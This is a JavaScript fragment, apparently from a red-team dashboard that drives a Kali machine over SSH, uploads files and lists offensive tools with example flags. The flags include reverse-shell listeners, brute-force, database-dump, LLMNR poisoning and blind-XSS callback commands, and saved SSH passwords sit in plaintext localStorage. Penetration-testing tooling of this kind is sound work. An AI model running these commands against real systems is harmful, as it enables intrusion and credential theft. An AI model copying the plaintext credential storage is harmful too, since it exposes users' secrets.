        if (e.key === 'ArrowUp' || e.key === 'ArrowDown') {
            e.preventDefault();
            const items = window._tabItems;
            if (!items || items.length === 0) return;
            const children = dd.children;
            if (window._tabIndex >= 0 && children[window._tabIndex]) {
                children[window._tabIndex].classList.remove('bg-neon/10', 'text-neon');
            }
            if (e.key === 'ArrowDown') {
                window._tabIndex = Math.min(window._tabIndex + 1, children.length - 1);
            } else {
                window._tabIndex = Math.max(window._tabIndex - 1, -1);
            }
            if (window._tabIndex >= 0 && children[window._tabIndex]) {
                children[window._tabIndex].classList.add('bg-neon/10', 'text-neon');
                children[window._tabIndex].scrollIntoView({ block: 'nearest' });
            }
        }
    });

    window.appendOutput = function (text) {
        text = stripANSI(text);

        // Normalize CRLF → LF first (shell uses \r\n for line breaks)
        text = text.replace(/\r\n/g, '\n');

        // Handle standalone \r (progress updates like apt: "0%\r100%\r")
        if (text.includes('\r')) {
            const parts = text.split('\r');
            for (const part of parts) {
                if (part === '') continue;
                const lastNewline = output.textContent.lastIndexOf('\n');
                if (lastNewline === -1) {
                    output.textContent = part;
                } else {
                    output.textContent = output.textContent.substring(0, lastNewline + 1) + part;
                }
            }
        } else {
            output.textContent += text + (text.endsWith('\n') ? '' : '\n');
        }

        // Buffer for findings parsing (ALWAYS accumulate, regardless of currentToolRunning)
        outputBuffer += text + '\n';
        if (outputBuffer.length > 100000) {
            outputBuffer = outputBuffer.slice(-50000);
        }

        // Detect prompt → trigger tool completion parser
        // Prompt format: "... with javi@kali  at HH:MM:SS  "
        if ((currentToolRunning || pendingTool) && /with\s+\S+\s+at\s+\d{1,2}:\d{2}:\d{2}/.test(text)) {
            clearTimeout(window._toolFinishTimer);
            window._toolTimerLongSet = false;
            finishToolOutput();
            pendingTool = null; // only cleared when prompt is actually detected
        }

        // Use setTimeout(0) for scroll — fires before requestAnimationFrame
        // and is more reliable for keeping scroll position during rapid output
        clearTimeout(window._scrollTimer);
        window._scrollTimer = setTimeout(() => {
            output.scrollTop = output.scrollHeight;
        }, 0);
    };

    // Click terminal output area → focus the command input
    output.addEventListener('click', () => cmdInput.focus());

    // ── Generate a deterministic compound key for a finding (for dedup) ──
    function _findingKey(f) {
        let base = `${f.tool}|${f.target}|${f.type}`;
        switch (f.type) {
            case 'port':     return `${base}|${f.port}/${f.protocol}|${f.service}`;
            case 'directory': return `${base}|${f.path}|${f.status}`;
            case 'vuln':     return `${base}|${(f.title||'').slice(0,80)}|${(f.detail||'').slice(0,80)}`;
            case 'tech':     return `${base}|${f.title}`;
            case 'user':     return `${base}|${f.title}`;
            case 'plugin':   return `${base}|${f.title}`;
            case 'os':       return `${base}|${f.detail||''}`;
            default:         return `${base}|${f.title||''}|${f.detail||''}`;
        }
    }

    // Called when we detect a tool has finished
    function finishToolOutput() {
        const tool = currentToolRunning || pendingTool;
        if (!tool || !outputBuffer || _toolParsed) return;

        // ⚡ Mark parsed IMMEDIATELY to prevent race with safety timer
        _toolParsed = true;

        const buf = outputBuffer;
        const target = targetInput.value.trim() || 'unknown';

        // Visual debug: show a badge in terminal
        const dbg = document.getElementById('fdbg');
        if (dbg) dbg.textContent = `⚙ parsing ${tool}...`;

        // Small delay to let the DOM settle (but dedup is now safe)
        setTimeout(() => {
            // Legacy report parsers
            if (tool === 'nmap') parseNmapOutput(buf, target);
            else if (tool === 'gobuster') parseGobusterOutput(buf, target);

            // NEW: Findings parsers (T3MP3ST-style)
            const items = parseToolOutput(tool, buf, target);
            if (items.length > 0) {
                addFindings(items);
            }
            if (dbg) dbg.textContent = `✓ ${items.length} findings (buf:${buf.length})`;
            setTimeout(() => { if (dbg) dbg.textContent = ''; }, 4000);
        }, 100);

        currentToolRunning = null;
        // pendingTool stays set until prompt is detected (cleared there)
        outputBuffer = '';
    }

    // ── Clear Terminal ──
    window.clearTerminal = function () {
        output.textContent = '';
        outputBuffer = '';
        currentToolRunning = null;
        pendingTool = null;
        _toolParsed = false;
        clearTimeout(window._toolFinishTimer);
        showToast('✕ Terminal cleared');
    };

    // ── File Upload to Kali (with chunked base64 for large files) ──
    window.handleFileUpload = async function (input) {
        const file = input.files && input.files[0];
        if (!file) return;
        const CHUNK_SIZE = 98 * 1024; // ~98KB base64 chunks (safe for SSH)
        const status = document.getElementById('file-upload-status');
        status.textContent = `📄 ${file.name} (${(file.size / 1024).toFixed(1)} KB)...`;

        // Try Supabase Storage first (if available)
        if (DataService && DataService.available) {
            status.textContent = `⬆ Uploading to cloud storage...`;
            showToast('⬆ Uploading to Supabase Storage...');
            const result = await DataService.uploadFile(file);
            if (result && result.public_url) {
                status.textContent = `✅ ${file.name} → cloud (${(file.size / 1024).toFixed(1)} KB)`;
                appendOutput(`\n▶ Uploaded to cloud: ${result.public_url}`);
                input.value = '';
                return;
            } else {
                status.textContent = `⚠️ Cloud upload failed, trying SSH...`;
            }
        }

        // ── SSH upload via base64 chunks (works for ALL file types) ──
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            status.textContent = `⚠️ Not connected — can't upload`;
            appendOutput('[!] Not connected to Kali. Connect first.');
            input.value = '';
            return;
        }

        const filename = file.name.replace(/[^a-zA-Z0-9._-]/g, '_');
        showToast(`⬆ Uploading ${filename} (${(file.size / 1024).toFixed(1)} KB)...`);

        // Read file as base64
        const reader = new FileReader();
        reader.onload = async function (e) {
            const base64data = e.target.result; // data:...;base64,XXXX
            const b64 = base64data.split(',')[1]; // strip the data URL prefix
            const totalChunks = Math.ceil(b64.length / CHUNK_SIZE);

            // Start fresh on Kali
            ws.send(`rm -f /tmp/${filename}.b64`);
            await new Promise(r => setTimeout(r, 200));

            for (let i = 0; i < totalChunks; i++) {
                const chunk = b64.slice(i * CHUNK_SIZE, (i + 1) * CHUNK_SIZE);
                ws.send(`printf '%s' '${_escapeSingleQuotes(chunk)}' >> /tmp/${filename}.b64`);
                status.textContent = `📤 Chunk ${i+1}/${totalChunks} (${Math.round((i+1)/totalChunks*100)}%)`;
                // Small delay to avoid flooding the SSH channel
                await new Promise(r => setTimeout(r, 50 + Math.min(chunk.length / 50, 200)));
            }

            // Decode base64 → final file
            ws.send(`base64 -d /tmp/${filename}.b64 > /tmp/${filename} && rm -f /tmp/${filename}.b64`);
            await new Promise(r => setTimeout(r, 300));
            ws.send(`ls -lh /tmp/${filename}`);
            status.textContent = `✅ ${file.name} uploaded to Kali:/tmp/ (${totalChunks} chunks)`;
            appendOutput(`\n▶ Uploaded "${file.name}" to /tmp/${filename} (${totalChunks} chunks)`);
            showToast(`📁 Uploaded ${filename} to Kali`);
            input.value = '';
        };
        reader.onerror = function () {
            status.textContent = '⚠️ Error reading file';
            appendOutput('[!] Error reading file for upload');
            input.value = '';
        };
        reader.readAsDataURL(file); // Read as base64 data URL
    };

    // ── Helper: escape single quotes for safe shell use ──
    function _escapeSingleQuotes(str) {
        // For printf '%s', only ' needs escaping (end quote, add \', resume quote)
        return str.replace(/'/g, "'\\''");
    }

    window.appendBanner = function () {
        appendOutput('');
        appendOutput('  ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗ ███████╗');
        appendOutput('  ██║   ██║██║   ██║██║     ████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝');
        appendOutput('  ██║   ██║██║   ██║██║     ██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║  ███╗█████╗  ');
        appendOutput('  ╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝  ');
        appendOutput('   ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗');
        appendOutput('    ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝');
        appendOutput('  ───────────────────────────────────────────────────────────────────────────────');
        appendOutput('  🌐 Red Team Dashboard  |  🔗 vulnforge.local  |  ⚡ 45 modules loaded');
        appendOutput('  ───────────────────────────────────────────────────────────────────────────────');
        appendOutput('');
    };

    // ============================================================
    //  CONNECTION MANAGER (localStorage)
    // ============================================================
    function loadConnections() {
        try {
            const stored = localStorage.getItem('vulnforge_connections');
            connections = stored ? JSON.parse(stored) : [];
        } catch {
            connections = [];
        }
        renderConnections();
    }

    function saveConnections() {
        localStorage.setItem('vulnforge_connections', JSON.stringify(connections));
        renderConnections();
    }

    function renderConnections() {
        connSelector.innerHTML = '<option value="">-- Select target --</option>';
        connections.forEach((c, i) => {
            const opt = document.createElement('option');
            opt.value = i;
            opt.textContent = `${c.name || 'Unknown'} (${c.ip})`;
            connSelector.appendChild(opt);
        });
        if (activeConnectionId !== null) {
            const exists = connections.some((_, i) => i === activeConnectionId);
            if (!exists) { activeConnectionId = null; hideActiveConn(); }
            else { showActiveConn(connections[activeConnectionId]); }
        }
    }

    function showActiveConn(conn) {
        activeConn.classList.remove('hidden');
        connDot.className = 'conn-dot ' + (ws && ws.readyState === WebSocket.OPEN ? 'online' : 'offline');
        connLabel.textContent = `${conn.name} (${conn.ip})`;
    }

    function hideActiveConn() {
        activeConn.classList.add('hidden');
    }

    window.showAddConnection = function () {
        document.getElementById('add-conn-form').classList.remove('hidden');
    };
    window.toggleAddConnection = function () {
        document.getElementById('add-conn-form').classList.add('hidden');
    };

    window.saveConnection = function () {
        const name = document.getElementById('new-conn-name').value.trim();
        const ip   = document.getElementById('new-conn-ip').value.trim();
        const port = parseInt(document.getElementById('new-conn-port').value) || 22;
        const user = document.getElementById('new-conn-user').value.trim();
        const pass = document.getElementById('new-conn-pass').value;
        if (!name || !ip || !user || !pass) {
            alert('⚠️  Fill in all fields: Alias, IP, User, Pass');
            return;
        }
        connections.push({ name, ip, port, user, pass });
        saveConnections();
        showToast(`✓ Connection "${name}" saved`);
        document.getElementById('new-conn-name').value = '';
        document.getElementById('new-conn-ip').value = '';
        document.getElementById('new-conn-port').value = '22';
        document.getElementById('new-conn-user').value = '';
        document.getElementById('new-conn-pass').value = '';
        document.getElementById('add-conn-form').classList.add('hidden');
    };

    connSelector.addEventListener('change', () => {
        const idx = parseInt(connSelector.value);
        if (isNaN(idx)) return;
        activeConnectionId = idx;
        const conn = connections[idx];
        showActiveConn(conn);
        targetInput.value = conn.ip;
    });

    window.disconnectConn = function () {
        disconnectWS();
        activeConnectionId = null;
        hideActiveConn();
        connSelector.value = '';
    };

    window.deleteActiveConnection = function () {
        if (activeConnectionId === null) return;
        const conn = connections[activeConnectionId];
        if (!conn) return;
        if (!confirm(`Delete connection "${conn.name}" (${conn.ip})?`)) return;
        disconnectWS();
        connections.splice(activeConnectionId, 1);
        activeConnectionId = null;
        saveConnections();
        hideActiveConn();
        connSelector.value = '';
        showToast(`🗑 Connection "${conn.name}" deleted`);
    };

    // ============================================================
    //  WEBSOCKET — SSH
    // ============================================================
    function connectWS() {
        if (ws && ws.readyState === WebSocket.OPEN) {
            appendOutput('[!] Already connected.');
            return;
        }
        if (activeConnectionId === null || !connections[activeConnectionId]) {
            appendOutput('[!] No connection selected. Go to Connections tab, add a target, and select it first.');
            return;
        }
        const conn = connections[activeConnectionId];
        const sshIp = conn.ip, sshPort = conn.port || 22, sshUser = conn.user, sshPass = conn.pass;
        appendOutput(`[*] Connecting to ${conn.name} (${sshIp}:${sshPort})...`);
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const WS_URL = window.WS_URL || `${protocol}//${window.location.host}/ws`;
        ws = new WebSocket(WS_URL);

        ws.onopen = () => {
            statusInd.classList.replace('offline', 'online');
            statusText.textContent = 'ONLINE';
            statusText.classList.replace('text-gray-600', 'text-neon');
            if (activeConnectionId !== null) connDot.className = 'conn-dot online';
            connBadge.textContent = `connected: ${sshUser}@${sshIp}:${sshPort}`;
            connTitle.textContent = `─╼ ${sshUser}@${sshIp}:${sshPort} ╾───────────────────────────`;
            ws.send(JSON.stringify({ type: 'auth', ip: sshIp, port: sshPort, user: sshUser, pass: sshPass }));
        };

        ws.onmessage = (event) => {
            const data = event.data;

            // Handle JSON protocol messages
            if (typeof data === 'string' && data.startsWith('{') && data.includes('"type"')) {
                try {
                    const msg = JSON.parse(data);
                    if (msg.type === 'connected') {
                        appendOutput(`[+] ${msg.message || 'SSH connection established'}`);
                    } else if (msg.type === 'error') {
                        appendOutput(`[!] ${msg.message || 'Unknown error'}`);
                    } else if (msg.type === 'tab_result') {
                        // Tab completion results from exec_command
                        if (_compTimer) clearTimeout(_compTimer);
                        showCompletionDropdown(msg.completions || []);
                        return;
                    }
                    return;
                } catch {}
            }

            appendOutput(data);

            // Safety timer: if prompt is not detected within 30s, force-parse
            // (so tools that don't produce a matching prompt still get findings)
            if (currentToolRunning && !window._toolTimerLongSet) {
                window._toolTimerLongSet = true;
                clearTimeout(window._toolFinishTimer);
                window._toolFinishTimer = setTimeout(() => {
                    window._toolTimerLongSet = false;
                    // Only parse if still running and buffer has data
                    if ((currentToolRunning || pendingTool) && outputBuffer.length > 200) {
                        finishToolOutput();
                    }
                }, 30000); // 30s safety net
            }
        };

        ws.onclose = () => {
            statusInd.classList.replace('online', 'offline');
            statusText.textContent = 'OFFLINE';
            statusText.classList.replace('text-neon', 'text-gray-600');
            connBadge.textContent = 'disconnected';
            connDot.className = 'conn-dot offline';
            appendOutput('\n[!] Connection closed.');
            ws = null;
        };
    }

    function disconnectWS() {
        currentToolRunning = null;
        pendingTool = null;
        _toolParsed = false;
        outputBuffer = '';
        clearTimeout(window._toolFinishTimer);
        if (ws && ws.readyState === WebSocket.OPEN) {
            appendOutput('[*] Closing connection...');
            ws.close();
        } else {
            appendOutput('[!] No active connection.');
        }
    }

    // ============================================================
    //  PREDEFINED COMMANDS (arsenal)
    // ============================================================
    window.sendPredefinedCmd = function (cmd) {
        if (!ensureConnected()) {
            appendOutput('[!] Connect to Kali first before launching modules.');
            return;
        }
        appendOutput(`\n▶ ${cmd}`);
        ws.send(cmd);
    };

    // ============================================================
    //  ARSENAL DATA + RENDER
    // ============================================================
    const ARSENAL_GROUPS = [
        {
            id: 'web-recon', label: 'Web Recon', color: 'text-cyan-400',
            tools: [
                { id: 'gobuster',    name: 'Gobuster',    desc: 'directorios web (common.txt)' },
                { id: 'dirb',        name: 'Dirb',        desc: 'fuerza bruta directorios' },
                { id: 'wfuzz',       name: 'Wfuzz',       desc: 'fuzzing (FUZZ param)' },
                { id: 'ffuf',        name: 'Ffuf',        desc: 'fuzzer ultrarrápido' },
                { id: 'feroxbuster', name: 'Feroxbuster', desc: 'directory scan rápido (Rust)' },
                { id: 'nikto',       name: 'Nikto',       desc: 'escáner vulnerabilidades web' },
                { id: 'whatweb',     name: 'WhatWeb',     desc: 'fingerprint tecnologías' },
                { id: 'wpscan',      name: 'Wpscan',      desc: 'escáner WordPress' },
                { id: 'cewl',        name: 'Cewl',        desc: 'generador wordlists desde web' },
                { id: 'wafw00f',     name: 'Wafw00f',     desc: 'detección WAF / IDS fingerprint' },
                { id: 'cors-check',  name: 'CORS Check',  desc: 'prueba CORS misconfiguration (Origin)' },
            ]
        },
        {
            id: 'network', label: 'Network', color: 'text-violet-400',
            tools: [
                { id: 'nmap',       name: 'Nmap',      desc: 'agresivo (-p- -sV -sC -O -A)' },
                { id: 'masscan',    name: 'Masscan',   desc: 'escaneo masivo 65535 puertos' },
                { id: 'netcat',     name: 'Netcat',    desc: 'escaneo TCP rápido 24 puertos' },
                { id: 'dnsrecon',   name: 'Dnsrecon',  desc: 'enumeración DNS' },
                { id: 'curl',       name: 'Curl',      desc: 'peticiones HTTP avanzadas' },
                { id: 'socat',      name: 'Socat',     desc: 'relay TCP/UDP, reverse shell' },
                { id: 'testssl',    name: 'TestSSL',   desc: 'análisis SSL/TLS (ciphers, vulns)' },
            ]
        },
        {
            id: 'smb', label: 'SMB / Windows', color: 'text-amber-400',
            tools: [
                { id: 'enum4linux',  name: 'Enum4linux',  desc: 'enumeración SMB completa' },
                { id: 'smbclient',   name: 'Smbclient',   desc: 'listar shares (null session)' },
                { id: 'evil-winrm',  name: 'Evil-WinRM',  desc: 'shell remota WinRM' },
                { id: 'impacket',    name: 'Impacket',    desc: 'psexec / smbexec / wmiexec' },
                { id: 'smbmap',      name: 'Smbmap',      desc: 'permisos SMB recursivo' },
                { id: 'ldapsearch',  name: 'Ldapsearch',  desc: 'enumeración LDAP (dominio)' },
                { id: 'bloodhound',  name: 'BloodHound',  desc: 'ingestor AD (bloodhound-python)' },
            ]
        },
        {
            id: 'pivoting', label: 'Pivoting', color: 'text-fuchsia-400',
            tools: [
                { id: 'ligolo',       name: 'Ligolo-ng',     desc: 'túnel reverse / agente pivoting' },
                { id: 'nc-listener',  name: 'NC Listener',   desc: 'listener reverse shell (LPORT)' },
                { id: 'chisel-client',name: 'Chisel Client', desc: 'túnel TCP/UDP rápido' },
                { id: 'proxychains',  name: 'Proxychains',   desc: 'encadenar proxies (SOCKS)' },
            ]
        },
        {
            id: 'crypto', label: 'Crypto / Decode', color: 'text-yellow-400',
            tools: [
                { id: 'jwt-decode',  name: 'JWT Decode',    desc: 'decodificar JWT tokens online' },
                { id: 'b64-encode',  name: 'Base64 Encode', desc: 'texto → base64' },
                { id: 'b64-decode',  name: 'Base64 Decode', desc: 'base64 → texto' },
                { id: 'john',        name: 'John',          desc: 'crack de hashes (rockyou)' },
                { id: 'hashcat',     name: 'Hashcat',       desc: 'GPU hash cracking (mode 0)' },
            ]
        },
        {
            id: 'exploitation', label: 'Exploitation', color: 'text-red-400',
            tools: [
                { id: 'hydra-ssh',    name: 'Hydra SSH',     desc: 'fuerza bruta SSH (rockyou)' },
                { id: 'hydra-ftp',    name: 'Hydra FTP',     desc: 'fuerza bruta FTP (rockyou)' },
                { id: 'sqlmap',       name: 'Sqlmap',        desc: 'detección automática SQLi' },
                { id: 'searchsploit', name: 'Searchsploit',  desc: 'buscar exploits por nombre/servicio' },
                { id: 'responder',    name: 'Responder',     desc: 'LLMNR/NBT-NS poisoning' },
                { id: 'burpsuite',    name: 'BurpSuite',     desc: 'proxy HTTP/S + lanzar en Kali' },
                { id: 'xsstrike',     name: 'XSStrike',      desc: 'XSS avanzado con fuzzing + bypass' },
                { id: 'dalfox',       name: 'Dalfox',        desc: 'XSS parameter scanner (Go)' },
                { id: 'nuclei',       name: 'Nuclei',        desc: 'escáner vulns basado en templates' },
            ]
        },
        {
            id: 'extract', label: 'Extract / Compress', color: 'text-emerald-400',
            tools: [
                { id: 'unzip',     name: 'Unzip',   desc: 'descomprimir .zip' },
                { id: 'tar-gz',    name: 'Tar.gz',  desc: 'extraer .tar.gz / .tgz' },
                { id: 'tar-xz',    name: 'Tar.xz',  desc: 'extraer .tar.xz' },
                { id: '7z-extract',name: '7z',      desc: 'extraer .7z' },
                { id: 'unrar',     name: 'Unrar',   desc: 'extraer .rar' },
                { id: 'gunzip',    name: 'Gunzip',  desc: 'descomprimir .gz' },
                { id: 'bunzip2',   name: 'Bunzip2', desc: 'descomprimir .bz2' },
            ]
        },
    ];

    const ARSENAL_LINKS = [
        { name: 'HackTricks',            url: 'https://hacktricks.wiki/en/index.html',                          icon: '📘' },
        { name: 'PortSwigger Academy',   url: 'https://portswigger.net/web-security',                            icon: '🔓' },
        { name: 'PayloadsAllTheThings',  url: 'https://github.com/swisskyrepo/PayloadsAllTheThings',             icon: '📦' },
        { name: 'Chisel',                url: 'https://github.com/jpillora/chisel',                              icon: '⛏' },
        { name: 'RevShells.com',         url: 'https://www.revshells.com/',                                     icon: '🐚' },
        { name: 'Exploit-DB',            url: 'https://www.exploit-db.com/',                                    icon: '💥' },
        { name: 'BurpSuite Community',   url: 'https://portswigger.net/burp/communitydownload',                  icon: '🕷' },
        { name: 'GTFOBins',             url: 'https://gtfobins.github.io/',                                    icon: '⬆' },
    ];

    const ARSENAL_UTILITIES = [
        { name: 'CyberChef',            url: 'https://gchq.github.io/CyberChef/',                               icon: '🔗' },
    ];

    const HARDWARE_STORES = [
        // ── Official Manufacturers ──
        { name: 'Hak5',              url: 'https://shop.hak5.org',                          badge: 'OFFICIAL',   badgeColor: 'text-green-400 border-green-400/30',  icon: '🏪', desc: 'USB Rubber Ducky, WiFi Pineapple, Bash Bunny, OMG Cable, Shark Jack, Key Croc', region: '🌎 USA / Global' },
        { name: 'Flipper Zero',      url: 'https://flipperzero.one',                        badge: 'OFFICIAL',   badgeColor: 'text-green-400 border-green-400/30',  icon: '🐬', desc: 'Flipper Zero multi-tool device & accessories', region: '🌎 Global' },
        { name: 'Great Scott Gadgets', url: 'https://greatscottgadgets.com',                 badge: 'OFFICIAL',   badgeColor: 'text-green-400 border-green-400/30',  icon: '📡', desc: 'HackRF, PortaPack, KrakenSDR — Software Defined Radio', region: '🌎 USA / Global' },
        { name: 'M5Stack',           url: 'https://m5stack.com',                            badge: 'OFFICIAL',   badgeColor: 'text-green-400 border-green-400/30',  icon: '📟', desc: 'ESP32 modules for IoT hacking & prototyping', region: '🌎 Global' },
        // ── Trusted Resellers ──
        { name: 'Lab 401',           url: 'https://lab401.com',                             badge: 'RESELLER ⭐', badgeColor: 'text-cyan-400 border-cyan-400/30',      icon: '🏪', desc: 'Hak5, Flipper Zero, Proxmark, HackRF, SDR, iCopy-X — EU exclusive distributor', region: '🇪🇺 France / 🇺🇸 USA' },
        { name: 'Hacker Warehouse',  url: 'https://hackerwarehouse.com',                    badge: 'RESELLER',   badgeColor: 'text-yellow-400 border-yellow-400/30', icon: '🏪', desc: 'Hak5, Flipper Zero, HackRF, PortaPack, accessories', region: '🇺🇸 USA' },
        { name: 'HackmoD',           url: 'https://hackmod.de',                             badge: 'RESELLER',   badgeColor: 'text-yellow-400 border-yellow-400/30', icon: '🏪', desc: 'Hak5, SDR, pentest tools, LEA & gov solutions', region: '🇩🇪 Germany' },
        { name: 'KSEC Labs',         url: 'https://labs.ksec.co.uk',                        badge: 'RESELLER',   badgeColor: 'text-yellow-400 border-yellow-400/30', icon: '🏪', desc: 'Hak5, red team tools, pentest hardware', region: '🇬🇧 UK' },
        { name: 'Firewire Revolution', url: 'https://firewire-revolution.de',               badge: 'RESELLER',   badgeColor: 'text-yellow-400 border-yellow-400/30', icon: '🏪', desc: 'Hak5, IT security hardware', region: '🇩🇪 Germany' },
        { name: 'SAPSAN',            url: 'https://sapsan-sklep.pl',                        badge: 'RESELLER',   badgeColor: 'text-yellow-400 border-yellow-400/30', icon: '🏪', desc: 'Hak5, pentest gear, IT security', region: '🇵🇱 Poland' },
    ];

    function renderToolButton(t) {
        return `<button onclick="launchTool('${t.id}')"
            class="tool-btn w-full bg-deep/50 hover:bg-deep text-left px-2.5 py-1.5 rounded text-[11px] font-mono transition-all duration-150 border border-gray-800 hover:border-neon/40 group">
            <span class="text-neon/70 group-hover:text-neon">#</span>
            <span class="text-gray-400 group-hover:text-gray-200">${t.name}</span>
            <span class="block text-[9px] text-gray-700 group-hover:text-gray-600 leading-tight">${t.desc}</span>
        </button>`;
    }

    function renderLinkButton(l) {
        return `<a href="${l.url}" target="_blank" rel="noopener"
            class="tool-btn flex items-center gap-2 w-full bg-deep/50 hover:bg-deep px-2.5 py-1.5 rounded text-[11px] font-mono transition-all duration-150 border border-gray-800 hover:border-cyber/40 group">
            <span class="text-cyber/70 group-hover:text-cyber">${l.icon}</span>
            <span class="text-gray-400 group-hover:text-gray-200">${l.name}</span>
            <span class="ml-auto text-[8px] text-gray-700">↗</span>
        </a>`;
    }

    function renderStoreButton(s) {
        return `<a href="${s.url}" target="_blank" rel="noopener"
            class="tool-btn flex items-center gap-2 w-full bg-deep/50 hover:bg-deep px-2.5 py-1.5 rounded text-[11px] font-mono transition-all duration-150 border border-gray-800 hover:border-orange-400/40 group">
            <span class="text-orange-400/70 group-hover:text-orange-400 shrink-0">${s.icon}</span>
            <div class="flex-1 min-w-0">
                <span class="flex items-center gap-1.5">
                    <span class="text-gray-400 group-hover:text-gray-200 truncate">${s.name}</span>
                    <span class="text-[7px] uppercase tracking-wider border px-1 rounded shrink-0 ${s.badgeColor}">${s.badge}</span>
                </span>
                <span class="block text-[8px] text-gray-700 leading-tight">${s.desc} <span class="text-gray-800">${s.region}</span></span>
            </div>
            <span class="text-[8px] text-gray-700 shrink-0">↗</span>
        </a>`;
    }

    function renderArsenal() {
        ARSENAL_GROUPS.forEach(g => {
            const container = document.getElementById(`arsenal-${g.id}`);
            if (container) container.innerHTML = g.tools.map(renderToolButton).join('');
        });
        const resContainer = document.getElementById('arsenal-resources');
        if (resContainer) resContainer.innerHTML = ARSENAL_LINKS.map(renderLinkButton).join('');
        const utilContainer = document.getElementById('arsenal-utilities');
        if (utilContainer) utilContainer.innerHTML = ARSENAL_UTILITIES.map(renderLinkButton).join('');
        const hwContainer = document.getElementById('arsenal-hardware');
        if (hwContainer) hwContainer.innerHTML = HARDWARE_STORES.map(renderStoreButton).join('');
        const totalItems = ARSENAL_GROUPS.reduce((s, g) => s + g.tools.length, 0) + ARSENAL_LINKS.length + ARSENAL_UTILITIES.length + HARDWARE_STORES.length;
        const totalSpan = document.getElementById('arsenal-total-count');
        if (totalSpan) totalSpan.textContent = `[${totalItems}]`;
        const toolCountSpan = document.getElementById('tool-count');
        if (toolCountSpan) toolCountSpan.textContent = totalItems;
    }

    function getLineCount(text) {
        return (text.match(/\n/g) || []).length + 1 + ' lines';
    }

    function ensureConnected() {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            appendOutput('[!] Connect to Kali first.');
            return false;
        }
        return true;
    }

    // ============================================================
    //  🔍 FILTER ARSENAL
    // ============================================================
    window.filterArsenal = function (query) {
        const q = query.toLowerCase().trim();
        const totalSpan = document.getElementById('arsenal-total-count');
        let visibleCount = 0;
        let totalCount = 0;

        document.querySelectorAll('.cat-header').forEach(header => {
            const body = header.nextElementSibling;
            if (!body || !body.classList.contains('cat-body')) return;
            const buttons = body.querySelectorAll('.tool-btn');
            let hasVisible = false;

            buttons.forEach(btn => {
                totalCount++;
                const text = btn.textContent.toLowerCase();
                if (!q || text.includes(q)) {
                    btn.style.display = '';
                    hasVisible = true;
                    visibleCount++;
                } else {
                    btn.style.display = 'none';
                }
            });

            // Show category if it has visible tools
            if (hasVisible) {
                header.style.display = '';
                body.style.display = '';
            } else {
                header.style.display = q ? 'none' : '';
                body.style.display = q ? 'none' : '';
            }
        });

        if (totalSpan) {
            totalSpan.textContent = q ? `[${visibleCount}/${totalCount}]` : `[${totalCount}]`;
        }
    };

    // ============================================================
    //  🚀 LAUNCH TOOL
    // ============================================================
    // ── Extra flags examples per tool ──
    const toolExamples = {
        gobuster: '-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x php,html,txt',
        dirb: '-w /usr/share/wordlists/dirb/big.txt -X .php,.html',
        wfuzz: '-w /usr/share/wfuzz/wordlist/general/common.txt --hc 403,500',
        ffuf: '-w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -recursion',
        feroxbuster: '-x php,html -L 3 --filter-status 401,403',
        nikto: '-ssl -port 443 -Format html -o /tmp/nikto.html',
        whatweb: '-a 3 --log-verbose /tmp/whatweb.log',
        wpscan: '--enumerate u,vp --plugins-detection aggressive',
        cewl: '-d 3 -m 6 -w /tmp/custom.txt -c',
        // ── WAF / IDS ──
        wafw00f: '-a -v -o /tmp/wafw00f_report.json',
        'cors-check': 'añade --headers "Origin: https://evil.com" para test manual',
        // ── Web Recon ──
        nmap: '-p 22,80,443,3306,8080 -sV -sC -Pn',
        masscan: '-p22,80,443 --rate=500 -oJ /tmp/masscan.json',
        netcat: '-zv 22 80 443 8080',
        dnsrecon: '-t rvl -D /usr/share/wordlists/dns/subdomains-top1mil-5000.txt',
        curl: '-k -L -A \"Mozilla/5.0\" -H \"X-Forwarded-For: 127.0.0.1\"',
        socat: 'TCP-LISTEN:4444,fork,reuseaddr -',
        // ── SSL/TLS ──
        testssl: '--full --htmlfile /tmp/report.html',
        // ── SMB / Windows ──
        enum4linux: '-U -S -G -P -r -R',
        smbclient: '-U guest -N -c ls',
        'evil-winrm': '-u <user> -p <pass> -s /opt/scripts',
        impacket: '-hashes :<ntlm_hash> -target-ip 10.10.10.10',
        smbmap: '-u <user> -p <pass> -d <domain> -R',
        ldapsearch: '-x -b \"dc=htb,dc=local\" \"(objectclass=user)\"',
        bloodhound: '-d htb.local -u <user> -p <pass> -c All',
        // ── Pivoting ──
        'nc-listener': '-lvnp 4444',
        'chisel-client': 'R:8080:localhost:3000 R:1080:socks',
        proxychains: 'nmap -sT -Pn 10.0.0.1 (se añade al inicio del comando)',
        ligolo: 'sudo ip route add 10.10.10.0/24 dev ligolo',
        // ── Exploitation ──
        'hydra-ssh': '-l <user> -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -t 8',
        'hydra-ftp': '-l admin -P /usr/share/wordlists/rockyou.txt -V -t 4',
        sqlmap: '--risk=3 --level=5 --dump-all --batch -D <dbname>',
        searchsploit: '-t <software> -w -o /tmp/exploits.txt',
        responder: '-I eth0 -dwv -o /tmp/responder_logs',
        burpsuite: '--collaborator-server --config-file=/tmp/config.json',
        // ── XSS ──
        xsstrike: '--data \"q=test&id=1\" --headers \"Cookie: session=abc\" --crawl',
        dalfox: '--custom-payload \"<script>alert(1)</script>\" --blind https://xss.ht',
        // ── Nuclei ──
        nuclei: '-severity critical,high -json -o /tmp/nuclei.json -t ~/nuclei-templates/',
    };

    window.clearExtraFlags = function () {
        document.getElementById('extra-flags').value = '';
        document.getElementById('extra-flags-example').classList.add('hidden');
        document.getElementById('extra-flags-hint').textContent = 'optional';
    };

    function updateExtraFlagsHint(tool) {
        const exampleText = document.getElementById('extra-flags-example-text');
        const exampleDiv = document.getElementById('extra-flags-example');
        const hint = document.getElementById('extra-flags-hint');
